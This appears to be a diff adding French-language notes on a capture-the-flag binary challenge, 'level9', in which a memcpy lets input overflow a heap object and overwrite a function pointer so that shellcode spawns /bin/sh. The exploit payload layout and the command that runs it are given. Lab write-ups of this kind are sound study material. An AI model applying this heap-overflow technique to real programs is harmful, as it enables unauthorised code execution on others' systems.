@@ -1,0 +1,21 @@
+./level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -> segfault
+
+0x08048629 <+53>:	call   0x80486f6 <N::N(int)> -> constructeur de la classe
+0x0804864b <+87>:	call   0x80486f6 <N::N(int)> -> constructeur de la classe
+Après analyse du code on voit que des objets sont stockés dans la heap. 
+
+0x08048677 <+131>:	call   0x804870e <N::setAnnotation(char*)> -> appelle methode
+On a un memcpy qui copy notre string d'entrée dans la heap. 
+
+On va donc utiliser un heap overflow pour lancer un shellcode qui executera /bin/sh.
+
+Notre shelcode est appellé par un pointeur sur fonction, on doit donc faire deux 
+redirection d'adresse. Notre shellcode sera donc du genre : 
+adresse du shellcode + shellcode + padding + addresse de l'adresse du shellcode
+
+L'adresse de l'adresse du shellcode doit être stockée dans n2 grâce à l'overflow.
+
+cat /tmp/exploit9.py > /tmp/test9
+
+./level9 `cat /tmp/test9`
